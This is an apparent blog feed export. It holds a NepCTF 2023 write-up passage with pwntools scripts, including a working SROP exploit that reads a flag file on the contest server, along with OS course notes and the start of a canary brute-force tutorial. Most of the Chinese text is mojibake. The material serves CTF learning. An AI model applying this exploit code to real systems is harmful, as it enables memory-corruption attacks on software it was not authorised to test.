python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">r = remote(<span class="string">&#x27;nepctf.1cepeak.cn&#x27;</span>, <span class="number">31762</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getboard</span>():</span><br><span class="line">    board = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        data = r.recvline().decode()[<span class="number">3</span>:].replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27; &#x27;</span>).strip()</span><br><span class="line">        data = data.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        board.append(data)</span><br><span class="line">    <span class="keyword">return</span> board</span><br><span class="line">table = <span class="string">&#x27;abcdefghijklmno&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    res = r.recvline().decode()</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">int</span>(res.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]) &gt;= <span class="number">38</span>):</span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    board = getboard()</span><br><span class="line">    random_x = random.randint(<span class="number">0</span>, <span class="number">14</span>)</span><br><span class="line">    random_y = random.randint(<span class="number">0</span>, <span class="number">14</span>)</span><br><span class="line">    <span class="keyword">while</span> board[random_y][random_x] != <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">        random_x = random.randint(<span class="number">0</span>, <span class="number">14</span>)</span><br><span class="line">        random_y = random.randint(<span class="number">0</span>, <span class="number">14</span>)</span><br><span class="line">    pos = table[random_x] + table[random_y]</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(pos)</span><br><span class="line">    r.recvline()</span><br></pre></td></tr></table></figure><h4 id="é™Œç”Ÿçš„è¯­è¨€"><a href="#é™Œç”Ÿçš„è¯­è¨€" class="headerlink" title="é™Œç”Ÿçš„è¯­è¨€"></a>é™Œç”Ÿçš„è¯­è¨€</h4><p>  æ ¹æ®æç¤ºAåŒå­¦ å¼€å§‹bing ç»“æœ ç«Ÿç„¶ çœ‹è¿‡ ï¼ˆæˆ‘æœ‰ç½ªï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814195648669.png" alt="image-20230814195648669"></p><p>â€‹    </p><h3 id="PWNå¤ç°"><a href="#PWNå¤ç°" class="headerlink" title="PWNå¤ç°"></a>PWNå¤ç°</h3><p>  ä¸æ˜¯æˆ‘è¯´ æ˜¯çœŸä¸ä¼šä½†æ˜¯è·Ÿç€å¤ç°cve ä»ä¸­å­¦åˆ°äº†å¾ˆå¤š</p><h4 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h4><p>é¢˜ç›®æç¤ºclassic pwn</p><p>å…ˆseccomp-toolsæŸ¥çœ‹æ˜¯å¦æœ‰æ²™ç›’<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230816102445148.png" alt="image-20230816102445148"></p><p>really existï¼<br>æœ‰æ²™ç›’ï¼Œåªèƒ½ä½¿ç”¨openï¼Œreadï¼Œwriteå‡½æ•°. goto 0009ä¸­0009æ˜¯return ALLOWè¯´æ˜å…è®¸æ‰§è¡Œ.<br>è‹¥ä¸ºgoto 00010åˆ™è¢«ç¦ç”¨. </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230816104100112.png" alt="image-20230816104100112"></p><p>â€‹    æ³¨æ„æ˜¯call syscallå‡½æ•°è€Œä¸æ˜¯ç›´æ¥syscall æ‰€ä»¥å¯„å­˜å™¨ä¼šæœ‰åç§»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;nepctf.1cepeak.cn&quot;</span>,<span class="number">30307</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;welcome to NepCTF2023!&quot;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">syscall = <span class="number">0x4005B0</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0x500</span>)</span><br><span class="line">read_function = SigreturnFrame()</span><br><span class="line">read_function.rdi = <span class="number">0</span></span><br><span class="line">read_function.rsi = <span class="number">0</span></span><br><span class="line">read_function.rdx = bss_addr-<span class="number">0x8</span></span><br><span class="line">read_function.rcx = <span class="number">0x500</span></span><br><span class="line">read_function.rip = syscall</span><br><span class="line">read_function.rsp = bss_addr</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(read_function)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span> = SigreturnFrame()</span><br><span class="line"><span class="built_in">open</span>.rdi = <span class="number">2</span></span><br><span class="line"><span class="built_in">open</span>.rsi = bss_addr-<span class="number">0x8</span></span><br><span class="line"><span class="built_in">open</span>.rdx = <span class="number">0</span></span><br><span class="line"><span class="built_in">open</span>.rcx = <span class="number">0</span></span><br><span class="line"><span class="built_in">open</span>.rip = syscall</span><br><span class="line"><span class="built_in">open</span>.rsp = bss_addr + <span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">read_function = SigreturnFrame()</span><br><span class="line">read_function.rdi = <span class="number">0</span></span><br><span class="line">read_function.rsi = <span class="number">3</span></span><br><span class="line">read_function.rdx = bss_addr - <span class="number">0x200</span></span><br><span class="line">read_function.rcx = <span class="number">0x100</span></span><br><span class="line">read_function.rip = syscall</span><br><span class="line">read_function.rsp = bss_addr + <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">write_funtion = SigreturnFrame()</span><br><span class="line">write_funtion.rdi = <span class="number">1</span></span><br><span class="line">write_funtion.rsi = <span class="number">1</span></span><br><span class="line">write_funtion.rdx = bss_addr - <span class="number">0x200</span></span><br><span class="line">write_funtion.rcx = <span class="number">0x100</span></span><br><span class="line">write_funtion.rip = syscall</span><br><span class="line">write_funtion.rsp = bss_addr+<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(<span class="built_in">open</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x108</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(read_function)</span><br><span class="line">payload = payload.ljust(<span class="number">0x208</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(write_funtion)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p>Nepctf{SROP_IT_IS_EAsY_6ee3e57b-3982-4924-844a-d362c3006b20}</p>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSç¢ç‰‡</title>
      <link href="/2023/11/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/11/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p>CDUå¤ä¹ èµ„æ–™å€¾æƒ…çŒ®ä¸Š.<br>ï¼ˆå…¶å®æœ‰æ›´å…¨çš„è€ƒç‚¹ æœ‰éœ€è¦ç§ä¿¡ddæˆ‘ æ˜¯çš„æˆ‘æ˜¯æ‡’ç‹—æ‡’å¾—å¯¼è¿‡æ¥ï¼‰</p><h2 id="æ“ä½œç³»ç»Ÿ"><a href="#æ“ä½œç³»ç»Ÿ" class="headerlink" title="æ“ä½œç³»ç»Ÿ"></a>æ“ä½œç³»ç»Ÿ</h2><h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p><strong>æ“ä½œç³»ç»Ÿæ˜¯ä¸€ä¸ªæ§åˆ¶ç¨‹åº</strong><br><strong>æ“ä½œç³»ç»Ÿæ˜¯ä¸€ä¸ªèµ„æºç®¡ç†å™¨</strong><br>åº”ç”¨ç¨‹åºä¸ç¡¬ä»¶ä¹‹é—´çš„ä¸­é—´å±‚<br>ç®¡ç†å„ç§è®¡ç®—æœºç¡¬ä»¶èµ„æº<br>æä¾›è®¿é—®è®¡ç®—æœºè½¯ç¡¬ä»¶èµ„æºçš„é«˜æ•ˆæ‰‹æ®µ<br>è§£å†³èµ„æºè®¿é—®å†²çª ç¡®ä¿èµ„æºä½¿ç”¨å…¬å¹³</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204113920281.png" alt="image-20240204113920281"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204113950135.png" alt="image-20240204113950135"></p><h3 id="æ“ä½œç³»ç»Ÿçš„è½¯ä»¶ç»„æˆ"><a href="#æ“ä½œç³»ç»Ÿçš„è½¯ä»¶ç»„æˆ" class="headerlink" title="æ“ä½œç³»ç»Ÿçš„è½¯ä»¶ç»„æˆ"></a>æ“ä½œç³»ç»Ÿçš„è½¯ä»¶ç»„æˆ</h3><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204114014147.png" alt="image-20240204114014147"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204114100956.png" alt="image-20240204114100956"></p><h3 id="æ“ä½œç³»ç»Ÿå†…æ ¸ç‰¹å¾"><a href="#æ“ä½œç³»ç»Ÿå†…æ ¸ç‰¹å¾" class="headerlink" title="æ“ä½œç³»ç»Ÿå†…æ ¸ç‰¹å¾"></a>æ“ä½œç³»ç»Ÿå†…æ ¸ç‰¹å¾</h3><p><strong>å¹¶å‘</strong><br>æ“ä½œç³»ç»Ÿä¸­æœ‰å¤šä¸ªè¿è¡Œçš„ç¨‹åº éœ€è¦osç®¡ç†å’Œè°ƒåº¦</p><p><strong>å…±äº«</strong><br>â€œåŒæ—¶â€è®¿é—®ï¼ˆå®è§‚ï¼‰<br>äº’æ–¥å…±äº«ï¼ˆå¾®è§‚ï¼‰</p><p><strong>è™šæ‹Ÿ</strong><br>åˆ©ç”¨å¤šé“ç¨‹åºè®¾è®¡ è®©æ¯ä¸ªç”¨æˆ·è§‰å¾—æœ‰ä¸€ä¸ªè®¡ç®—æœºä¸ºtaæä¾›æœåŠ¡</p><p><strong>å¼‚æ­¥</strong><br>ç¨‹åºçš„æ‰§è¡Œèµ°èµ°åœåœï¼ˆå¯é¢„æµ‹ï¼‰ å‘å‰æ¨è¿›çš„é€Ÿåº¦ä¸å¯é¢„çŸ¥<br>åªè¦è¿è¡Œç¯å¢ƒç›¸åŒ oséœ€è¦ä¿è¯ç¨‹åºè¿è¡Œçš„ç»“æœä¹Ÿç›¸åŒ ï¼ˆè¾“å…¥ä¸€è‡´ è¾“å‡ºç»“æœåº”è¯¥æ˜¯ä¸å˜çš„ï¼‰</p><h3 id="æ“ä½œç³»ç»Ÿçš„ä¸»è¦åŠŸèƒ½"><a href="#æ“ä½œç³»ç»Ÿçš„ä¸»è¦åŠŸèƒ½" class="headerlink" title="æ“ä½œç³»ç»Ÿçš„ä¸»è¦åŠŸèƒ½"></a>æ“ä½œç³»ç»Ÿçš„ä¸»è¦åŠŸèƒ½</h3><p>ç¡¬ä»¶æŠ½è±¡å’Œåè°ƒç®¡ç† ç”¨æˆ·å’Œç¡¬ä»¶é—´æ²Ÿé€šçš„æ¡¥æ¢</p><h3 id="æ“ä½œç³»ç»Ÿçš„æ¼”å˜"><a href="#æ“ä½œç³»ç»Ÿçš„æ¼”å˜" class="headerlink" title="æ“ä½œç³»ç»Ÿçš„æ¼”å˜"></a>æ“ä½œç³»ç»Ÿçš„æ¼”å˜</h3><p><strong>å•ç”¨æˆ·ç³»ç»Ÿ</strong><br>æ“ä½œç³»ç»Ÿ&#x3D;è£…è½½å™¨+é€šç”¨å­ç¨‹åº<br>æ˜‚è´µç»„ä»¶ä½æ•ˆç‡<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204120454111.png" alt="image-20240204120454111"></p><p>é¡ºåºæ‰§è¡Œ é¡ºåºæ‰“å°<br>ä¸€ä¸ªä½œä¸šæ¥ä¸€ä¸ªä½œä¸š</p><p><strong>æ‰¹å¤„ç†ç³»ç»Ÿ</strong><br><strong>å¤šï¼ˆé“ï¼‰ç¨‹åºç³»ç»Ÿ</strong><br>äº¤æ›¿æ‰§è¡Œ<br>æ¡ä»¶ï¼šå‰ä¸€ä¸ªæ­£åœ¨æ‰§è¡Œçš„ç¨‹åºä¸»åŠ¨è®©å‡ºCPUæ‰§è¡Œæƒ</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204120646648.png" alt="image-20240204120646648"></p><p><strong>åˆ†æ—¶ç³»ç»Ÿ</strong><br>äº¤æ›¿è¿è¡Œ</p><p><strong>ä¸ªäººè®¡ç®—æœº</strong>ï¼šæ¯ä¸ªç”¨æˆ·ä¸€ä¸ªç³»ç»Ÿ   å§<br>åº”ç”¨æ€§</p><p><strong>åˆ†å¸ƒå¼è®¡ç®—æœº</strong>ï¼šæ¯ä¸ªç”¨æˆ·å¤šä¸ªç³»ç»Ÿ<br>å®‰å…¨æ€§<br>ç½‘ç»œæˆä¸ºä¸€ä¸ªé‡è¦çš„åŠŸèƒ½<br>é€šå¸¸æ”¯æŒåˆ†å¸ƒå¼æœåŠ¡<br>  è·¨å¤šç³»ç»Ÿçš„æ•°æ®å…±äº«å’Œåè°ƒ<br>å¯èƒ½ä½¿ç”¨å¤šä¸ªå¤„ç†å™¨ï¼ˆ ä¸€å°æœºå™¨ä¸­å¯èƒ½ä½¿ç”¨å¤šä¸ªCPUï¼‰<br>   æ¾ã€ç´§è€¦åˆç³»ç»Ÿ<br>é«˜å¯ç”¨æ€§ä¸å¯é æ€§</p><h3 id="æ“ä½œç³»ç»Ÿçš„ç»“æ„"><a href="#æ“ä½œç³»ç»Ÿçš„ç»“æ„" class="headerlink" title="æ“ä½œç³»ç»Ÿçš„ç»“æ„"></a>æ“ä½œç³»ç»Ÿçš„ç»“æ„</h3><h4 id="ç®€å•ç»“æ„"><a href="#ç®€å•ç»“æ„" class="headerlink" title="ç®€å•ç»“æ„"></a>ç®€å•ç»“æ„</h4><p>MS-DOS<br>åœ¨æœ€å°çš„ç©ºé—´ è®¾è®¡ç”¨äºæä¾›å¤§éƒ¨åˆ†åŠŸèƒ½<br>æ²¡æœ‰æ‹†åˆ†ä¸ºæ¨¡å—<br>ä¸»è¦ç”¨æ±‡ç¼–ç¼–å†™</p><h4 id="åˆ†å±‚ç»“æ„"><a href="#åˆ†å±‚ç»“æ„" class="headerlink" title="åˆ†å±‚ç»“æ„"></a>åˆ†å±‚ç»“æ„</h4><h4 id="å¾®å†…æ ¸ç»“æ„"><a href="#å¾®å†…æ ¸ç»“æ„" class="headerlink" title="å¾®å†…æ ¸ç»“æ„"></a>å¾®å†…æ ¸ç»“æ„</h4><p>å°½å¯èƒ½å¤šçš„å†…æ ¸åŠŸèƒ½ç§»åˆ°ç”¨æˆ·æ€<br>ç”¨æˆ·æ€çš„åº”</p><h4 id="å¤–æ ¸ç»“æ„"><a href="#å¤–æ ¸ç»“æ„" class="headerlink" title="å¤–æ ¸ç»“æ„"></a>å¤–æ ¸ç»“æ„</h4><p>å†…æ ¸åˆ†é…æœºå™¨çš„ç‰©ç†èµ„æºç»™å¤šä¸ªåº”ç”¨ç¨‹åº å¹¶è®©æ¯ä¸ªç¨‹åºå†³å®šå¦‚ä½•å¤„ç†è¿™äº›èµ„æº<br>ç¨‹åºèƒ½é“¾æ¥åˆ°æ“ä½œç³»ç»Ÿåº“ï¼ˆlibOSï¼‰å®ç°äº†æ“ä½œç³»ç»ŸæŠ½è±¡<br>ä¿æŠ¤ä¸æ§åˆ¶åˆ†ç¦»</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240204135858817.png" alt="image-20240204135858817"></p><h4 id="VMMï¼ˆè™šæ‹Ÿæœºç®¡ç†å™¨ï¼‰"><a href="#VMMï¼ˆè™šæ‹Ÿæœºç®¡ç†å™¨ï¼‰" class="headerlink" title="VMMï¼ˆè™šæ‹Ÿæœºç®¡ç†å™¨ï¼‰"></a>VMMï¼ˆè™šæ‹Ÿæœºç®¡ç†å™¨ï¼‰</h4><p>å°†å•ç‹¬çš„æœºå™¨æ¥å£è½¬æ¢æˆå¾ˆå¤šçš„è™šæ‹Ÿæœº æ¯ä¸ªè™šæ‹Ÿæœºéƒ½æ˜¯ä¸€ä¸ªåŸå§‹è®¡ç®—æœºç³»ç»Ÿçš„æœ‰æ•ˆå‰¯æœ¬ å¹¶èƒ½å®Œæˆæ‰€æœ‰çš„å¤„ç†å™¨æŒ‡ä»¤</p><p>VMMè´Ÿè´£èµ„æºçš„éš”ç¦» OSè´Ÿè´£èµ„æºç®¡ç†</p><h4 id="å¯åŠ¨ã€ä¸­æ–­ã€å¼‚å¸¸å’Œç³»ç»Ÿè°ƒç”¨"><a href="#å¯åŠ¨ã€ä¸­æ–­ã€å¼‚å¸¸å’Œç³»ç»Ÿè°ƒç”¨" class="headerlink" title="å¯åŠ¨ã€ä¸­æ–­ã€å¼‚å¸¸å’Œç³»ç»Ÿè°ƒç”¨"></a>å¯åŠ¨ã€ä¸­æ–­ã€å¼‚å¸¸å’Œç³»ç»Ÿè°ƒç”¨</h4><h5 id="å¯åŠ¨æ—¶è®¡ç®—æœºå†…å­˜å’Œç£ç›˜å¸ƒå±€"><a href="#å¯åŠ¨æ—¶è®¡ç®—æœºå†…å­˜å’Œç£ç›˜å¸ƒå±€" class="headerlink" title="å¯åŠ¨æ—¶è®¡ç®—æœºå†…å­˜å’Œç£ç›˜å¸ƒå±€"></a>å¯åŠ¨æ—¶è®¡ç®—æœºå†…å­˜å’Œç£ç›˜å¸ƒå±€</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240211110148513.png" alt="image-20240211110148513"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240211110326491.png" alt="image-20240211110326491"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240211110438193.png" alt="image-20240211110438193"></p><p>æœ€åå°†æ§åˆ¶æƒäº¤åˆ°æ“ä½œç³»ç»Ÿ</p><p><strong>BIOSç³»ç»Ÿè°ƒç”¨</strong><br>BIOSä»¥ä¸­æ–­è°ƒç”¨çš„æ–¹å¼æä¾›äº†åŸºæœ¬çš„I&#x2F;OåŠŸèƒ½<br>INT 10h:å­—ç¬¦æ˜¾ç¤º<br>INT 13h:ç£ç›˜æ‰‡åŒºè¯»å†™<br>INT 15h:æ£€æµ‹å†…å­˜å¤§å°<br>INT 16h:é”®ç›˜è¾“å…¥<br>åªèƒ½åœ¨x86çš„å®æ¨¡å¼ä¸‹è®¿é—®</p><h4 id="è®¡ç®—æœºå¯åŠ¨æµç¨‹"><a href="#è®¡ç®—æœºå¯åŠ¨æµç¨‹" class="headerlink" title="è®¡ç®—æœºå¯åŠ¨æµç¨‹"></a>è®¡ç®—æœºå¯åŠ¨æµç¨‹</h4><p>ç³»ç»ŸåŠ ç”µ BIOSç³»ç»Ÿåˆå§‹åŒ–ï¼ˆä¸»å¼•å¯¼è®°å½• BIOSè¯»å–ä¸»å¼•å¯¼æ‰‡åŒºçš„ä»£ç ï¼‰ä¸»å¼•å¯¼è®°å½•æ‰‡åŒºä»£ç è¯»å–æ´»åŠ¨åˆ†åŒºçš„å¼•å¯¼æ‰‡åŒºä»£ç  åŠ è½½ç¨‹åºï¼ˆå¼•å¯¼æ‰‡åŒºä»£ç è¯»å–æ–‡ä»¶ç³»ç»Ÿçš„åŠ è½½ç¨‹åºï¼‰</p><h5 id="CPUåˆå§‹åŒ–"><a href="#CPUåˆå§‹åŒ–" class="headerlink" title="CPUåˆå§‹åŒ–"></a>CPUåˆå§‹åŒ–</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240216135444045.png" alt="image-20240216135444045"></p><h5 id="BIOSåˆå§‹åŒ–"><a href="#BIOSåˆå§‹åŒ–" class="headerlink" title="BIOSåˆå§‹åŒ–"></a>BIOSåˆå§‹åŒ–</h5><h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240216135728291.png" alt="image-20240216135728291"></h5><h5 id="ä¸»å¼•å¯¼è®°å½•MBRæ ¼å¼"><a href="#ä¸»å¼•å¯¼è®°å½•MBRæ ¼å¼" class="headerlink" title="ä¸»å¼•å¯¼è®°å½•MBRæ ¼å¼"></a>ä¸»å¼•å¯¼è®°å½•MBRæ ¼å¼</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240216135943337.png" alt="image-20240216135943337"></p><h5 id="åˆ†åŒºå¼•å¯¼æ‰‡åŒºæ ¼å¼"><a href="#åˆ†åŒºå¼•å¯¼æ‰‡åŒºæ ¼å¼" class="headerlink" title="åˆ†åŒºå¼•å¯¼æ‰‡åŒºæ ¼å¼"></a>åˆ†åŒºå¼•å¯¼æ‰‡åŒºæ ¼å¼</h5><p>æ­¤å¤„è·³è½¬æŒ‡ä»¤è·Ÿç³»ç»Ÿæœ‰å…³ CPUä¸åŒæŒ‡ä»¤ä¸åŒ<br>å…¨éƒ¨æœ‰512å­—èŠ‚ æ´»åŠ¨åˆ†åŒºç”¨åˆ°64å­—èŠ‚<br>å¯åŠ¨ä»£ç å­˜åˆ°ç¡¬ç›˜ä¸Š&#x2F;è½¯ç›˜ä¸Š å†³å®šåŠ è½½ç¨‹åºå­˜å‚¨ä½ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240216140724616.png" alt="image-20240216140724616"></p><h5 id="åŠ è½½ç¨‹åº"><a href="#åŠ è½½ç¨‹åº" class="headerlink" title="åŠ è½½ç¨‹åº"></a>åŠ è½½ç¨‹åº</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240216140846749.png" alt="image-20240216140846749"></p><h4 id="ç³»ç»Ÿå¯åŠ¨è§„èŒƒ"><a href="#ç³»ç»Ÿå¯åŠ¨è§„èŒƒ" class="headerlink" title="ç³»ç»Ÿå¯åŠ¨è§„èŒƒ"></a>ç³»ç»Ÿå¯åŠ¨è§„èŒƒ</h4><h5 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h5><p>å›ºåŒ–åˆ°è®¡ç®—æœºä¸»æ¿ä¸Šçš„ç¨‹åº<br>åŒ…æ‹¬ç³»ç»Ÿè®¾ç½®ã€è‡ªæ£€ç¨‹åºå’Œç³»ç»Ÿè‡ªå¯åŠ¨ç¨‹åº<br>BIOS-MBRï¼ˆä¸»å¼•å¯¼è®°å½•ï¼‰ã€BIOS-GPTï¼ˆå…¨å±€å”¯ä¸€æ ‡è¯†åˆ†åŒºè¡¨ï¼‰ã€PXEï¼ˆç½‘ç»œå¯åŠ¨æ ‡å‡†ï¼‰</p><p>UEFIï¼ˆç»Ÿä¸€å¯æ‰©å±•å›ºä»¶æ¥å£ï¼‰<br>æ¥å£æ ‡å‡†<br>åœ¨æ‰€æœ‰å¹³å°ä¸Šä¸€è‡´çš„æ“ä½œç³»ç»Ÿå¯åŠ¨æœåŠ¡<br>å¯ä¿¡å¯åŠ¨æµç¨‹ BIOSå¯åŠ¨å ä¼šå¯¹å¼•å¯¼è®°å½•è¿›è¡Œæ£€æŸ¥ åªæœ‰æœ‰æ ‡ç­¾çš„ä»£ç å¯æ‰§è¡Œ</p>]]></content>
      
      
      <categories>
          
          <category> ç¢ç‰‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canaryè§£å†³å§¿åŠ¿</title>
      <link href="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"/>
      <url>/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="Canaryè§£å†³å§¿åŠ¿"><a href="#Canaryè§£å†³å§¿åŠ¿" class="headerlink" title="Canaryè§£å†³å§¿åŠ¿"></a><strong>Canaryè§£å†³å§¿åŠ¿</strong></h2><p>è¢«æŠ˜ç£¨çš„æœ‰ç‚¹éš¾å— æ‰¾ä¸ªæ—¶é—´æ¥æ–©æ€ï¼ˆbushiï¼‰åˆæ˜¯è¢«è™çš„ä¸€å¤©~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230627202644.jpg"></p><hr><p><u>æœ‰é—®é¢˜è¯·æŒ‡æ­£~</u>â€<br><u>è·å–ä¾‹é¢˜è¯·åœ¨è¯„è®ºåŒºç•™è¨€æˆ–ç§ä¿¡æˆ‘</u>â­</p><h4 id="ä¸€ã€canaryçˆ†ç ´"><a href="#ä¸€ã€canaryçˆ†ç ´" class="headerlink" title="ä¸€ã€canaryçˆ†ç ´"></a><strong>ä¸€ã€canaryçˆ†ç ´</strong></h4><p>æ ‡å¿—æç¤ºå°±ç®—forkå‡½æ•°å§ å¤šçº¿ç¨‹å¼€æ”»</p><p><strong>ã€funcannaryã€‘</strong>*</p><p>ï¼ˆ1ï¼‰å…ˆè¿è¡Œä¸€ä¸‹ pedaé…å¥—checksec<br>                       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png" alt="image-20230530002528552"><br>                       æ ¹æ®é¢˜ç›®æç¤ºâ€™have funâ€™å’Œâ€™welcomeâ€™åœ¨çˆ†ç ´çš„expä¸­ä¼šç”¨ä½œäºè¦†ç›–èŠ‚ç‚¹</p><p>â€‹                              â€‹<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png" alt="image-20230530002620435"> </p><p>â€‹         å‘ç°Canaryå’ŒPIEéƒ½å¼€ å‡†å¤‡å¥½çˆ†ç ´ï¼ˆå¦‚æœæœ‰å¯ä»¥åˆ©ç”¨çš„å­—ç¬¦ä¸²canaryä¹Ÿå¯ä»¥ç»•è¿‡ï¼‰<br>â€‹         å¯¹åº”éšæœºåŒ– åç»­åœ¨IDAä¸­åªèƒ½åˆ©ç”¨å…¶åœ°å€è®¡ç®—åç§»</p><p>ï¼ˆ2ï¼‰è¿›IDA </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png" alt="image-20230530002919532"></p><p>forkæ¥å£ &#x3D;&#x3D; canaryçˆ†ç ´ï¼ˆå¤šçº¿ç¨‹ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png" 